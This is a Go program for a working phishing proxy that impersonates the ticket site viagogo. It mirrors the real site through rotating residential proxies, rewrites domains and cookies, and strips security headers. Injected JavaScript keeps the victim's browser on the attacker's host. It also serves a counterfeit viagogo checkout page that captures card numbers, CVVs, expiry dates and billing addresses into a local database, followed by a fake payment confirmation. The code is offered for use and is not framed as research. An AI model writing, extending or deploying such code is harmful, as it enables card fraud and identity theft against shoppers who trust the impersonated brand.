package main

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	mr "math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/mattn/go-sqlite3"
	"github.com/rs/zerolog"
)

var (
	EXTERNAL_HOST         = os.Getenv("EXTERNAL_HOSTNAME")
	ENCRYPTION_KEY        = mustGetEnv("ENCRYPTION_KEY")
	RESIDENTIAL_PROXY     = os.Getenv("RESIDENTIAL_PROXY")
	RESIDENTIAL_PROXY_LIST = os.Getenv("RESIDENTIAL_PROXY_LIST")
	LOG_LEVEL             = getEnvOrDefault("LOG_LEVEL", "info")
	SESSION_TTL           = 15 * time.Minute
	MAX_SESSIONS          = 50
)

var VIAGOGO_DOMAINS = []string{
	"www.viagogo.com",
	"viagogo.com",
	"api.viagogo.com",
	"checkout.viagogo.com",
	"myaccount.viagogo.com",
	"assets.viagogo.com",
	"static.viagogo.com",
}

var EXCLUDED_REQ_HEADERS = map[string]bool{
	"host": true, "origin": true, "referer": true,
	"x-forwarded-for": true, "x-forwarded-proto": true,
	"x-forwarded-host": true, "x-forwarded-port": true,
	"x-real-ip": true, "cf-connecting-ip": true,
	"true-client-ip": true, "accept-encoding": true,
}

var EXCLUDED_RES_HEADERS = map[string]bool{
	"content-encoding": true, "content-length": true,
	"transfer-encoding": true, "connection": true,
	"strict-transport-security": true,
	"content-security-policy": true,
	"content-security-policy-report-only": true,
	"x-frame-options": true, "x-xss-protection": true,
}

type PaymentData struct {
	CardNumber      string `json:"card_number"`
	ExpiryMonth     string `json:"expiry_month"`
	ExpiryYear      string `json:"expiry_year"`
	CVV             string `json:"cvv"`
	CardholderName  string `json:"cardholder_name"`
	BillingAddress1 string `json:"billing_address_1,omitempty"`
	BillingCity     string `json:"billing_city,omitempty"`
	BillingZip      string `json:"billing_zip,omitempty"`
	BillingCountry  string `json:"billing_country,omitempty"`
}

type Session struct {
	ID         string
	CookieVal  string
	CreatedAt  time.Time
	LastAccess time.Time
	IP         string
	UserAgent  string
}

var (
	logger        zerolog.Logger
	db            *sql.DB
	sessionMap    sync.Map
	encryptionKey []byte
	domainRegex   *regexp.Regexp
	proxyURLs     []*url.URL
	proxyURLsMu   sync.RWMutex
	httpClient    *http.Client
	cleanupTicker *time.Ticker
)

func main() {
	zerolog.TimeFieldFormat = time.RFC3339
	logger = zerolog.New(os.Stderr).With().Timestamp().Logger()
	level, _ := zerolog.ParseLevel(LOG_LEVEL)
	zerolog.SetGlobalLevel(level)

	if EXTERNAL_HOST == "" {
		logger.Fatal().Msg("EXTERNAL_HOSTNAME не задан")
	}

	var err error
	encryptionKey, err = base64.StdEncoding.DecodeString(ENCRYPTION_KEY)
	if err != nil || len(encryptionKey) != 32 {
		logger.Fatal().Msg("ENCRYPTION_KEY должен быть 32 байта в base64")
	}

	db, err = sql.Open("sqlite3", "file:payments.db?cache=shared&_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		logger.Fatal().Err(err).Msg("Не удалось открыть БД")
	}
	defer db.Close()

	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS payments (
			id TEXT PRIMARY KEY,
			timestamp TEXT NOT NULL,
			ip_hash TEXT NOT NULL,
			session_id TEXT NOT NULL,
			encrypted_data BLOB NOT NULL,
			status TEXT DEFAULT 'new'
		);
		CREATE INDEX IF NOT EXISTS idx_timestamp ON payments(timestamp);
		CREATE INDEX IF NOT EXISTS idx_session ON payments(session_id);
	`)
	if err != nil {
		logger.Fatal().Err(err).Msg("Не удалось создать таблицы")
	}

	domainPattern := strings.Join(VIAGOGO_DOMAINS, "|")
	domainRegex = regexp.MustCompile(`(?i)(https?://)?(` + domainPattern + `)`)

	proxyURLs = parseProxyList()
	if len(proxyURLs) == 0 {
		logger.Warn().Msg("Не настроено ни одного резидентского прокси")
	}

	transport := &http.Transport{
		Proxy: func(req *http.Request) (*url.URL, error) {
			proxyURLsMu.RLock()
			defer proxyURLsMu.RUnlock()
			if len(proxyURLs) == 0 {
				return nil, nil
			}
			return proxyURLs[mr.IntN(len(proxyURLs))], nil
		},
		DialContext: (&net.Dialer{
			Timeout:   15 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   20,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
	}

	httpClient = &http.Client{
		Transport: transport,
		Timeout:   25 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	cleanupTicker = time.NewTicker(30 * time.Second)
	go func() {
		for range cleanupTicker.C {
			cleanupSessions()
		}
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("/health", healthHandler)
	mux.HandleFunc("/api/capture", capturePaymentHandler)
	mux.HandleFunc("/checkout/payment", fakePaymentHandler)
	mux.HandleFunc("/", proxyHandler)

	srv := &http.Server{Addr: ":8080", Handler: mux}
	go func() {
		logger.Info().Str("host", EXTERNAL_HOST).Int("proxies", len(proxyURLs)).Msg("Прокси запущен на :8080")
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Fatal().Err(err).Msg("Ошибка HTTP-сервера")
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	logger.Info().Msg("Завершение работы...")
	cleanupTicker.Stop()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	srv.Shutdown(ctx)
}

func parseProxyList() []*url.URL {
	var rawList []string

	if RESIDENTIAL_PROXY != "" {
		rawList = append(rawList, RESIDENTIAL_PROXY)
	}
	if RESIDENTIAL_PROXY_LIST != "" {
		parts := strings.Split(RESIDENTIAL_PROXY_LIST, ",")
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if p != "" {
				rawList = append(rawList, p)
			}
		}
	}

	var result []*url.URL
	for _, raw := range rawList {
		u, err := url.Parse(raw)
		if err != nil {
			logger.Error().Err(err).Str("proxy", raw).Msg("Невалидный URL прокси")
			continue
		}
		if u.Scheme == "" {
			u.Scheme = "http"
		}
		result = append(result, u)
	}

	return result
}

func getOrCreateSession(ip, userAgent string) *Session {
	cookieVal := uuid.New().String()
	session := &Session{
		ID:         uuid.New().String(),
		CookieVal:  cookieVal,
		CreatedAt:  time.Now(),
		LastAccess: time.Now(),
		IP:         ip,
		UserAgent:  userAgent,
	}

	var count int
	sessionMap.Range(func(key, value interface{}) bool {
		count++
		return true
	})

	if count >= MAX_SESSIONS {
		var oldestKey interface{}
		var oldestTime time.Time
		sessionMap.Range(func(key, value interface{}) bool {
			s := value.(*Session)
			if oldestKey == nil || s.LastAccess.Before(oldestTime) {
				oldestKey = key
				oldestTime = s.LastAccess
			}
			return true
		})
		if oldestKey != nil {
			sessionMap.Delete(oldestKey)
		}
	}

	sessionMap.Store("session:"+cookieVal, session)
	logger.Info().Str("session_id", session.ID).Str("ip", ip).Msg("Сессия создана")
	return session
}

func getSessionByCookie(r *http.Request) *Session {
	cookie, err := r.Cookie("proxy_session")
	if err != nil {
		return nil
	}
	if s, ok := sessionMap.Load("session:" + cookie.Value); ok {
		session := s.(*Session)
		session.LastAccess = time.Now()
		return session
	}
	return nil
}

func cleanupSessions() {
	cutoff := time.Now().Add(-SESSION_TTL)
	var toDelete []string
	sessionMap.Range(func(key, value interface{}) bool {
		s := value.(*Session)
		if s.LastAccess.Before(cutoff) {
			toDelete = append(toDelete, key.(string))
		}
		return true
	})
	for _, k := range toDelete {
		sessionMap.Delete(k)
	}
	if len(toDelete) > 0 {
		logger.Debug().Int("count", len(toDelete)).Msg("Просроченные сессии удалены")
	}
}

func replaceDomains(text string) string {
	return domainRegex.ReplaceAllStringFunc(text, func(match string) string {
		parts := domainRegex.FindStringSubmatch(match)
		if len(parts) > 1 && parts[1] != "" {
			return parts[1] + EXTERNAL_HOST
		}
		return "//" + EXTERNAL_HOST
	})
}

func buildAntiRedirectScript() string {
	host := EXTERNAL_HOST
	domainsJSON, _ := json.Marshal(VIAGOGO_DOMAINS)

	return fmt.Sprintf(`
(function() {
	const REAL_HOST = %q;
	const VIAGOGO_DOMAINS = %s;

	function isViagogo(url) {
		if (!url || typeof url !== 'string') return false;
		const lower = url.toLowerCase();
		for (const d of VIAGOGO_DOMAINS) {
			if (lower.includes(d) && !lower.includes(REAL_HOST)) return true;
		}
		return false;
	}

	function rewrite(url) {
		if (!url || typeof url !== 'string') return url;
		let result = url;
		for (const d of VIAGOGO_DOMAINS) {
			result = result.replace(new RegExp(d.replace(/\./g, '\\.'), 'gi'), REAL_HOST);
		}
		return result;
	}

	const origHrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
	Object.defineProperty(Location.prototype, 'href', {
		get: function() { return origHrefDesc.get.call(this); },
		set: function(val) {
			if (isViagogo(val)) val = rewrite(val);
			origHrefDesc.set.call(this, val);
		}
	});

	const origReplace = Location.prototype.replace;
	Location.prototype.replace = function(url) {
		if (isViagogo(url)) url = rewrite(url);
		return origReplace.call(this, url);
	};

	const origAssign = Location.prototype.assign;
	Location.prototype.assign = function(url) {
		if (isViagogo(url)) url = rewrite(url);
		return origAssign.call(this, url);
	};

	const origPush = history.pushState;
	history.pushState = function(s, t, url) {
		if (url && isViagogo(url)) url = rewrite(url);
		return origPush.call(this, s, t, url);
	};
	const origReplaceState = history.replaceState;
	history.replaceState = function(s, t, url) {
		if (url && isViagogo(url)) url = rewrite(url);
		return origReplaceState.call(this, s, t, url);
	};

	const origFetch = window.fetch;
	window.fetch = function(input, init) {
		if (typeof input === 'string' && isViagogo(input)) {
			input = rewrite(input);
		} else if (input instanceof Request && isViagogo(input.url)) {
			input = new Request(rewrite(input.url), input);
		}
		return origFetch.call(this, input, init);
	};

	const OrigXHR = window.XMLHttpRequest;
	window.XMLHttpRequest = function() {
		const xhr = new OrigXHR();
		const origOpen = xhr.open;
		xhr.open = function(method, url, ...args) {
			if (isViagogo(url)) url = rewrite(url);
			return origOpen.call(this, method, url, ...args);
		};
		return xhr;
	};
	window.XMLHttpRequest.prototype = OrigXHR.prototype;

	const origOpen = window.open;
	window.open = function(url, ...args) {
		if (isViagogo(url)) url = rewrite(url);
		return origOpen.call(this, url, ...args);
	};

	new MutationObserver(function(mutations) {
		for (const m of mutations) {
			for (const node of m.addedNodes) {
				if (node.tagName === 'META' && node.httpEquiv === 'refresh') {
					const c = node.getAttribute('content');
					if (c && isViagogo(c)) node.setAttribute('content', rewrite(c));
				}
			}
		}
	}).observe(document.documentElement, {childList: true, subtree: true});
})();
`, host, string(domainsJSON))
}

func decompressBody(body []byte, contentEncoding string) ([]byte, error) {
	switch strings.ToLower(strings.TrimSpace(contentEncoding)) {
	case "gzip":
		reader, err := gzip.NewReader(bytes.NewReader(body))
		if err != nil {
			return nil, err
		}
		defer reader.Close()
		return io.ReadAll(reader)
	case "deflate":
		reader := flate.NewReader(bytes.NewReader(body))
		defer reader.Close()
		return io.ReadAll(reader)
	default:
		return body, nil
	}
}

func compressBody(body []byte, contentEncoding string) ([]byte, error) {
	switch strings.ToLower(strings.TrimSpace(contentEncoding)) {
	case "gzip":
		var buf bytes.Buffer
		writer := gzip.NewWriter(&buf)
		if _, err := writer.Write(body); err != nil {
			return nil, err
		}
		if err := writer.Close(); err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	case "deflate":
		var buf bytes.Buffer
		writer, err := flate.NewWriter(&buf, flate.DefaultCompression)
		if err != nil {
			return nil, err
		}
		if _, err := writer.Write(body); err != nil {
			return nil, err
		}
		if err := writer.Close(); err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	default:
		return body, nil
	}
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
	var count int
	sessionMap.Range(func(key, value interface{}) bool {
		count++
		return true
	})

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":       "ok",
		"host":         EXTERNAL_HOST,
		"sessions":     count,
		"max_sessions": MAX_SESSIONS,
		"proxies":      len(proxyURLs),
	})
}

func capturePaymentHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", 405)
		return
	}

	var payment PaymentData
	if err := json.NewDecoder(r.Body).Decode(&payment); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(400)
		json.NewEncoder(w).Encode(map[string]string{"status": "error", "message": "invalid json"})
		return
	}
	defer r.Body.Close()

	if payment.CardNumber == "" || payment.CVV == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(400)
		json.NewEncoder(w).Encode(map[string]string{"status": "error", "message": "missing fields"})
		return
	}

	encrypted, err := encryptPaymentData(&payment)
	if err != nil {
		logger.Error().Err(err).Msg("Ошибка шифрования")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"status": "error", "message": "internal error"})
		return
	}

	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip, _, _ = net.SplitHostPort(r.RemoteAddr)
	}
	ipHash := fmt.Sprintf("%x", sha256.Sum256([]byte(ip)))

	sessionID := "unknown"
	if cookie, err := r.Cookie("proxy_session"); err == nil {
		sessionID = cookie.Value
	}

	id := uuid.New().String()
	_, err = db.Exec(
		"INSERT INTO payments (id, timestamp, ip_hash, session_id, encrypted_data, status) VALUES (?, ?, ?, ?, ?, ?)",
		id, time.Now().UTC().Format(time.RFC3339), ipHash, sessionID, encrypted, "new",
	)
	if err != nil {
		logger.Error().Err(err).Msg("Ошибка сохранения в БД")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]string{"status": "error", "message": "internal error"})
		return
	}

	logger.Info().Str("id", id).Str("ip_hash", ipHash).Msg("Платёж сохранён")

	payment = PaymentData{}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(200)
	json.NewEncoder(w).Encode(map[string]string{
		"status":   "ok",
		"message":  "Payment processing...",
		"redirect": fmt.Sprintf("https://%s/myaccount/orders?status=processing", EXTERNAL_HOST),
	})
}

func fakePaymentHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.WriteHeader(200)
	w.Write([]byte(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payment - viagogo</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center}
.container{background:#fff;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.3);padding:40px;width:480px;max-width:90vw}
.header{text-align:center;margin-bottom:30px}
.header h2{color:#333;font-size:22px;font-weight:600}
.header p{color:#666;font-size:14px;margin-top:5px}
.amount{background:#f8f9fa;border-radius:8px;padding:15px;text-align:center;margin-bottom:25px}
.amount .price{font-size:28px;font-weight:700;color:#333}
.amount .label{font-size:12px;color:#888;text-transform:uppercase}
.form-group{margin-bottom:18px}
.form-group label{display:block;font-size:13px;font-weight:600;color:#444;margin-bottom:6px;text-transform:uppercase}
.form-group input{width:100%;padding:12px 15px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color 0.3s;outline:none}
.form-group input:focus{border-color:#667eea}
.form-row{display:flex;gap:15px}
.form-row .form-group{flex:1}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:600;cursor:pointer;transition:transform 0.2s,box-shadow 0.2s;margin-top:10px}
.btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(102,126,234,0.4)}
.btn:active{transform:translateY(0)}
.secure{text-align:center;margin-top:20px;color:#999;font-size:12px}
.secure span{color:#4caf50}
.error{color:#e74c3c;font-size:13px;margin-top:5px;display:none}
.success-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;justify-content:center;align-items:center;flex-direction:column}
.success-overlay .checkmark{font-size:80px;margin-bottom:20px}
.success-overlay h2{color:#27ae60;font-size:24px}
.success-overlay p{color:#666;margin-top:10px}
.spinner{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 0.8s linear infinite;margin-left:10px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<svg width="120" height="30" viewBox="0 0 120 30"><text x="0" y="22" font-size="22" font-weight="700" fill="#333">viagogo</text></svg>
<h2>Secure Payment</h2>
<p>All transactions are encrypted and secure</p>
</div>
<div class="amount">
<div class="label">Total Amount</div>
<div class="price">$<span id="amount-display">0.00</span></div>
</div>
<form id="payment-form">
<div class="form-group"><label>Cardholder Name</label><input type="text" id="cardholder" placeholder="John Doe" required autocomplete="cc-name"></div>
<div class="form-group"><label>Card Number</label><input type="text" id="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required autocomplete="cc-number"></div>
<div class="form-row">
<div class="form-group"><label>Expiry Month</label><input type="text" id="expmonth" placeholder="MM" maxlength="2" required></div>
<div class="form-group"><label>Expiry Year</label><input type="text" id="expyear" placeholder="YYYY" maxlength="4" required></div>
<div class="form-group"><label>CVV</label><input type="text" id="cvv" placeholder="123" maxlength="4" required autocomplete="cc-csc"></div>
</div>
<div class="form-group"><label>Billing Address</label><input type="text" id="address" placeholder="123 Main Street"></div>
<div class="form-row">
<div class="form-group"><label>City</label><input type="text" id="city" placeholder="New York"></div>
<div class="form-group"><label>ZIP Code</label><input type="text" id="zip" placeholder="10001"></div>
</div>
<div class="form-group"><label>Country</label><input type="text" id="country" placeholder="United States"></div>
<div class="error" id="error-msg"></div>
<button type="submit" class="btn" id="submit-btn">Pay Securely</button>
</form>
<div class="secure"><span>🔒</span> Your payment is secured with 256-bit encryption</div>
</div>
<div class="success-overlay" id="success-overlay">
<div class="checkmark">✅</div>
<h2>Payment Successful!</h2>
<p>Redirecting to your orders...</p>
</div>
<script>
(function(){
var params=new URLSearchParams(window.location.search);
document.getElementById('amount-display').textContent=params.get('amount')||'0.00';
document.getElementById('cardnumber').addEventListener('input',function(e){
var v=this.value.replace(/\s/g,'').replace(/[^\d]/g,'');
if(v.length>16)v=v.slice(0,16);
this.value=v.replace(/(.{4})/g,'$1 ').trim();
});
['expmonth','expyear','cvv'].forEach(function(id){
document.getElementById(id).addEventListener('input',function(e){
this.value=this.value.replace(/[^\d]/g,'');
});
});
document.getElementById('payment-form').addEventListener('submit',async function(e){
e.preventDefault();
var btn=document.getElementById('submit-btn');
var errDiv=document.getElementById('error-msg');
btn.disabled=true;
btn.innerHTML='Processing... <span class="spinner"></span>';
errDiv.style.display='none';
var data={
card_number:document.getElementById('cardnumber').value.replace(/\s/g,''),
expiry_month:document.getElementById('expmonth').value,
expiry_year:document.getElementById('expyear').value,
cvv:document.getElementById('cvv').value,
cardholder_name:document.getElementById('cardholder').value,
billing_address_1:document.getElementById('address').value,
billing_city:document.getElementById('city').value,
billing_zip:document.getElementById('zip').value,
billing_country:document.getElementById('country').value
};
try{
var resp=await fetch('/api/capture',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(data)
});
var result=await resp.json();
if(result.status==='ok'){
document.getElementById('success-overlay').style.display='flex';
setTimeout(function(){
window.location.href=result.redirect||'/myaccount/orders';
},2000);
}else{
errDiv.textContent=result.message||'Payment failed.';
errDiv.style.display='block';
btn.disabled=false;
btn.innerHTML='Pay Securely';
}
}catch(err){
errDiv.textContent='Network error. Please check your connection.';
errDiv.style.display='block';
btn.disabled=false;
btn.innerHTML='Pay Securely';
}
});
})();
</script>
</body>
</html>`))
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	session := getSessionByCookie(r)
	if session == nil {
		ip := r.Header.Get("X-Forwarded-For")
		if ip == "" {
			ip, _, _ = net.SplitHostPort(r.RemoteAddr)
		}
		session = getOrCreateSession(ip, r.UserAgent())
	}

	http.SetCookie(w, &http.Cookie{
		Name:     "proxy_session",
		Value:    session.CookieVal,
		Path:     "/",
		Domain:   r.Host,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
		MaxAge:   int(SESSION_TTL.Seconds()),
	})

	if strings.HasPrefix(r.URL.Path, "/checkout/payment") {
		fakePaymentHandler(w, r)
		return
	}

	path := strings.TrimPrefix(r.URL.Path, "/")
	targetURL := fmt.Sprintf("https://www.viagogo.com/%s", path)
	if r.URL.RawQuery != "" {
		targetURL += "?" + r.URL.RawQuery
	}

	proxyReq, err := http.NewRequestWithContext(r.Context(), r.Method, targetURL, r.Body)
	if err != nil {
		logger.Error().Err(err).Str("url", targetURL).Msg("Ошибка создания запроса")
		http.Error(w, "Proxy error", 502)
		return
	}

	for key, values := range r.Header {
		if EXCLUDED_REQ_HEADERS[strings.ToLower(key)] {
			continue
		}
		for _, v := range values {
			proxyReq.Header.Add(key, v)
		}
	}

	proxyReq.Header.Set("Host", "www.viagogo.com")
	proxyReq.Header.Set("Origin", "https://"+EXTERNAL_HOST)
	proxyReq.Header.Set("Referer", "https://"+EXTERNAL_HOST+"/"+path)

	if _, ok := proxyReq.Header["User-Agent"]; !ok {
		proxyReq.Header.Set("User-Agent", r.UserAgent())
	}
	if _, ok := proxyReq.Header["Accept-Language"]; !ok {
		proxyReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
	}
	if _, ok := proxyReq.Header["Accept"]; !ok {
		proxyReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	}

	resp, err := httpClient.Do(proxyReq)
	if err != nil {
		logger.Error().Err(err).Str("url", targetURL).Msg("Ошибка прокси-запроса")
		http.Error(w, "Proxy error", 502)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" {
			location = replaceDomains(location)
			if !strings.Contains(location, EXTERNAL_HOST) {
				location = "https://" + EXTERNAL_HOST + "/"
			}
		} else {
			location = "https://" + EXTERNAL_HOST + "/"
		}

		for key, values := range resp.Header {
			for _, v := range values {
				if strings.ToLower(key) == "set-cookie" {
					v = rewriteCookie(v)
				}
				w.Header().Add(key, v)
			}
		}

		w.Header().Set("Location", location)
		w.WriteHeader(resp.StatusCode)
		return
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		logger.Error().Err(err).Msg("Ошибка чтения тела ответа")
		http.Error(w, "Proxy error", 502)
		return
	}

	contentType := resp.Header.Get("Content-Type")
	contentEncoding := resp.Header.Get("Content-Encoding")

	bodyBytes, err = decompressBody(bodyBytes, contentEncoding)
	if err != nil {
		logger.Warn().Err(err).Msg("Ошибка декомпрессии, используем как есть")
	}

	if shouldModifyContent(contentType) {
		textContent := string(bodyBytes)
		textContent = replaceDomains(textContent)

		if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "application/xhtml") {
			textContent = injectAntiRedirect(textContent)
		}

		if strings.Contains(contentType, "javascript") || strings.Contains(contentType, "text/html") {
			textContent = rewriteJSAssignments(textContent)
		}

		bodyBytes = []byte(textContent)

		bodyBytes, err = compressBody(bodyBytes, contentEncoding)
		if err != nil {
			logger.Warn().Err(err).Msg("Ошибка компрессии, отдаём без сжатия")
			w.Header().Del("Content-Encoding")
			w.Header().Del("Content-Length")
		}
	}

	for key, values := range resp.Header {
		keyLower := strings.ToLower(key)
		if EXCLUDED_RES_HEADERS[keyLower] {
			continue
		}
		for _, v := range values {
			if keyLower == "set-cookie" {
				v = rewriteCookie(v)
			}
			if keyLower == "location" {
				v = replaceDomains(v)
			}
			w.Header().Add(key, v)
		}
	}

	for _, bad := range []string{"Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"} {
		w.Header().Del(bad)
	}

	w.Header().Del("Content-Length")
	w.WriteHeader(resp.StatusCode)
	w.Write(bodyBytes)
}

func shouldModifyContent(contentType string) bool {
	ct := strings.ToLower(contentType)
	modifiable := []string{"text/html", "text/css", "application/javascript", "application/x-javascript", "text/javascript", "application/json", "application/xml", "text/xml", "application/xhtml"}
	for _, m := range modifiable {
		if strings.Contains(ct, m) {
			return true
		}
	}
	return false
}

func injectAntiRedirect(html string) string {
	headClose := strings.Index(html, "</head>")
	script := "<script>" + buildAntiRedirectScript() + "</script>"
	if headClose != -1 {
		return html[:headClose] + script + html[headClose:]
	}
	return script + html
}

func rewriteJSAssignments(js string) string {
	host := regexp.QuoteMeta(EXTERNAL_HOST)
	patterns := []struct {
		re   *regexp.Regexp
		repl string
	}{
		{
			regexp.MustCompile(`(window\.location|location|document\.location)\s*=\s*["']([^"']*viagogo\.com[^"']*)["']`),
			`$1 = "https://` + host + `/"`,
		},
		{
			regexp.MustCompile(`(window\.location\.href|location\.href|document\.location\.href)\s*=\s*["']([^"']*viagogo\.com[^"']*)["']`),
			`$1 = "https://` + host + `/"`,
		},
	}
	for _, p := range patterns {
		js = p.re.ReplaceAllString(js, p.repl)
	}
	return js
}

func rewriteCookie(cookie string) string {
	cookie = regexp.MustCompile(`(?i)Domain=\.?viagogo\.com`).ReplaceAllString(cookie, "Domain="+EXTERNAL_HOST)
	cookie = regexp.MustCompile(`(?i);\s*Secure`).ReplaceAllString(cookie, "")
	cookie = regexp.MustCompile(`(?i)Path=[^;]+`).ReplaceAllString(cookie, "Path=/")
	return cookie
}

func encryptPaymentData(data *PaymentData) ([]byte, error) {
	plaintext, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	defer func() {
		for i := range plaintext {
			plaintext[i] = 0
		}
	}()

	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func mustGetEnv(key string) string {
	val := os.Getenv(key)
	if val == "" {
		logger.Fatal().Str("var", key).Msg("Переменная окружения обязательна, но не задана")
	}
	return val
}

func getEnvOrDefault(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return defaultVal
}

func init() {
	sql.Register("sqlite3", &sqlite3.SQLiteDriver{
		ConnectHook: func(conn *sqlite3.SQLiteConn) error {
			return nil
		},
	})
}
